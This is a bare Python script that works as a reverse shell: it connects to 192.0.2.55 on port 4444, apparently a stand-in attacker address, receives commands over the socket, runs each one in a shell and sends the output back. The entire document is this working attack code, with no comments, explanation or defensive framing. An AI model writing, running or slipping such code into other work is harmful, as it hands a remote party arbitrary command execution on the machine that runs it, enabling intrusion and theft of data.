import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.0.2.55', 4444))
while True:
    cmd = s.recv(1024).decode(errors='ignore').strip()
    if not cmd:
        break
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except Exception as e:
        out = str(e).encode()
    s.sendall(out + b'\n>> ')
s.close()